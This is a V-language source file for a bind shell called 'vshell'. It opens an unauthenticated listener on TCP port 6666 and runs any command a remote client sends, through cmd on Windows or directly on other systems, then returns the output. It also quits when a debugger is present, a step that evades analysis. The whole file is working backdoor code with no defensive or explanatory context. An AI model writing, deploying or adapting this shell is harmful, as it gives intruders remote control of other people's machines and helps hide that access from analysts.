import net
import os

/*
* use "exit" to close connection, use CTRL-C to close program on remote host
*/
fn main() {
	if os.debugger_present() {
		return
	}

	mut listener := net.listen_tcp(.ip, ':6666')!
	listener.addr()!

	for {
		mut conn := listener.accept()!
		spawn handle_conn(mut conn)
	}
	listener.close()!
}

fn handle_conn(mut conn net.TcpConn) ! {
	// println(conn) // debug
	mut exit := false
	mut count := 0 // tcp timeout counter
	for exit == false {
		conn.write_string('vshell:${os.user_os()}> ')!
		conn.wait_for_read() or {
			count++
			if count == 3 {
				exit = true
			}
			continue
		}

		buffer := conn.read_line()

		if buffer == '' {
			exit = true
			continue
		}

		// print(buffer)	// debugging
		if buffer != 'exit\n' {
			mut output := ''
			$if windows {
				output = os.execute('cmd /c ' + buffer[..buffer.len - 1]).str()
			} $else {
				output = os.execute(buffer).str()
			}
			conn.write_string(output + '\n') or { continue }
		} else {
			conn.write_string('Bye\n')!
			exit = true
		}
	}
	conn.close()!
}
